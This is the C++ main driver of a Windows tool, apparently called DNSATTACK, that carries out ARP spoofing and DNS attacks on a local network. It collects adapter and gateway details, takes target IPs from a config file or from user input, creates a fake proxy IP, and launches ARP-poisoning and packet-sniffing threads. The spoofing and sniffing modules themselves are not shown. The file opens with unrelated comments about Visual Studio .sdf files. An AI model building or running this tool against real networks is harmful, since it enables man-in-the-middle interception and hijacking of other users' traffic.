//SQL Server Compact Edition Database File (.sdf)文件，是工程的信息保存成了数据库文件，
//如果你没有参加大型的团队项目，不涉及到高深的调试过程，这个文件对于你来说没什么用了，可以放心的删除，
//如果你后来又需要这个文件了，简单，打开工程里的.sln文件重新编译链接就ok了。
//如果完全不需要，有讨厌这个文件太大，那么可以：在Visual Studio里进入如下设置：
//进入“Tools > Options”，选择“Text Editor > C/C++ > Advanced”，然后找到“Fallback Location”。
//然后把“Always use Fallback Location”和“Do Not Warn if Fallback Location”设置成“True” 

#include <stdio.h>
//#include <winsock.h>
//#include <WINSOCK2.H>
#include <windows.h>
#include "Public.h"
#include "Packet.h"
#include "PublicUtils.h"
#include "PacketProcess.h"
#include "..\\include\\pcap.h"
#include "..\\include\\pcap\\pcap.h"
#include "..\\include\\openssl\\ssl.h"
#include "..\\include\\openssl\\err.h"

#include "connectionManager.h"

#pragma comment ( lib, "..\\lib\\libeay32.lib" )
#pragma comment ( lib, "..\\lib\\ssleay32.lib" )
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"..\\lib\\wpcap.lib")

#include <Nb30.h>
#include <IPHlpApi.h>
#pragma comment(lib,"netapi32.lib")
#include "NetcardInfo.h"
#include "ArpCheat.h"
#include "ClientAddress.h"
#include <vector>
#include "config.h"
#include "virtualIP.h"
#include "staticGateway.h"
#include "Public.h"
#include "winpcap.h"
#include "RefreshTargets.h"
#include "nat.h"
#include <stdlib.h>


#define WSASTARTUP_VERSION					0x0202

//netsh interface ip set address name ="localConnection" source= static 192.168.10.5 255.255.255.0 192.168.10.1




int __cdecl main(int argc, TCHAR* argv[])
{

	//test();

	int	nRetCode = 0;

	char curdir[MAX_PATH] = { 0 };
	nRetCode = GetCurrentDirectoryA(MAX_PATH, curdir);
	string curPath = string(curdir) + "\\";

	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData = {0};
	if (WSAStartup(wVersionRequested, &wsaData) != 0)
	{
		printf("WSAStartup error,error code is:%d\n", GetLastError());
		getchar();
		return -1;
	}

	
	int	iInterfaceCnt = 0;
	PIP_ADAPTER_INFO padpterInfo = NetcardInfo::ShowNetCardInfo(&iInterfaceCnt);
	if (padpterInfo == FALSE)
	{
		getchar();
		return FALSE;
	}

	printf("请输入arp攻击的网卡序号(1-%d):", iInterfaceCnt);
	int			iChooseNum = 0;
	scanf_s("%d", &iChooseNum);
	printf("\n");
	if (iChooseNum < 1 || iChooseNum > iInterfaceCnt)
	{
		printf("Interface number out of range\n");
		getchar();
		return -1;
	}
	PIP_ADAPTER_INFO pAdapter = NetcardInfo::GetNetCardAdapter(padpterInfo, iChooseNum - 1);
	
	gLocalIP = inet_addr(pAdapter->IpAddressList.IpAddress.String);
	string tmp = Public::formatIP(gLocalIP);
	printf("local ip:%s\r\n", tmp.c_str());

	gGatewayIP = inet_addr(pAdapter->GatewayList.IpAddress.String);
	tmp = Public::formatIP(gGatewayIP);
	printf("gateway ip:%s\r\n", tmp.c_str());

	memmove(gLocalMAC, pAdapter->Address, MAC_ADDRESS_SIZE);
	tmp = Public::formatMAC(gLocalMAC);
	printf("local mac:%s\r\n", tmp.c_str());

	nRetCode = ClientAddress::getMACFromIP(gGatewayIP, gGatewayMAC);
	tmp = Public::formatMAC(gGatewayMAC);
	printf("gate way mac:%s\r\n", tmp.c_str());

	gNetMask = inet_addr(pAdapter->IpAddressList.IpMask.String);
	tmp = Public::formatIP(gNetMask);
	printf("subnet mask:%s\r\n", tmp.c_str());

	gNetMaskIP = gNetMask & gGatewayIP;
	tmp = Public::formatIP(gNetMaskIP);
	printf("net mask ip:%s\r\n", tmp.c_str());

	lstrcpyA(gDevName, pAdapter->AdapterName);
	printf("net card name:%s\r\n", gDevName);

	gNetcardIndex = pAdapter->Index;
	printf("net card index:%d\r\n", gNetcardIndex);

	gCardName = StaticGateway::getAdapterAlias(gDevName);
	printf("net card alias:%s\r\n", gCardName.c_str());

	string devdescp = pAdapter->Description;

	GlobalFree((char*)padpterInfo);

	
	nRetCode = StaticGateway::bindStaticGatewayMac(gNetcardIndex, gGatewayIP, gGatewayMAC);




	nRetCode = Config::getAttackTarget(curPath + string(CONFIG_INIT_FILENAME),gAttackTargetIP,&gCapSpeed,&gArpDelay);
	if (gAttackTargetIP.size() <= 0)
	{
		printf("not find config in file:%s\r\n", (curPath + string(CONFIG_INIT_FILENAME)).c_str());
		do 
		{
			printf("Please input ip to attack:");
			char sztargets[4096] = { 0 };
			scanf("%s", sztargets);
			printf("\r\n");

			nRetCode = Config::getAttackTargetFromCmd(sztargets,gAttackTargetIP,&gCapSpeed,&gArpDelay);
			if (nRetCode > 0)
			{
				break;
			}
			else {
				printf("error format input\r\n");
			}

		} while (1);
	}

	pcap_t * pcapt = Winpcap::init(string(gDevName),gCapSpeed);
	if (pcapt <= 0)
	{
		return -1;
	}

	//gFakeProxyIP = inet_addr("10.1.1.111");
	//gFakeProxyIP = inet_addr("192.168.137.111");
	printf("\r\nFirst scanning LAN targets,please wait a moment...\r\n");
	gFakeProxyIP = VirtualIP::makeVirtualIP(pcapt, gOnlineObjects);
	if (gFakeProxyIP <= 0) {
		getchar();
		return -1;
	}


	HANDLE hThreadArpCheat = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ArpCheat::ArpCheatProc, pcapt,0, 0);
	CloseHandle(hThreadArpCheat);


	HANDLE hPcapMainProcess = CreateThread(0,0,(LPTHREAD_START_ROUTINE)PacketProcess::Sniffer, pcapt,0,0);
	if(hPcapMainProcess == FALSE)
	{
		printf("CreateThread error!error code is:%d\n",GetLastError());
		getchar();
		return GetLastError();
	}
// 	nRetCode = SetThreadPriority(hPcapMainProcess,THREAD_PRIORITY_HIGHEST);
// 	if(!nRetCode)
// 	{
// 		printf("SetThreadPriority error!error code is:%d\n",GetLastError());
// 		getchar();
// 		return GetLastError();
// 	}
	CloseHandle(hPcapMainProcess);

	HANDLE hclear = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ConnectionManager::clearmap, 0, 0, 0);
	CloseHandle(hclear);

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RefreshTargets::refreshTargets, pcapt, 0, 0));

	printf("DNSATTACK正在监听网卡:%s\n", devdescp.c_str());

	while (TRUE)
	{
		Sleep(0xffffffff);
	}

	//pcap_freealldevs(pcapDevBuf);
	pcap_close(pcapt);
	
	return nRetCode;
}
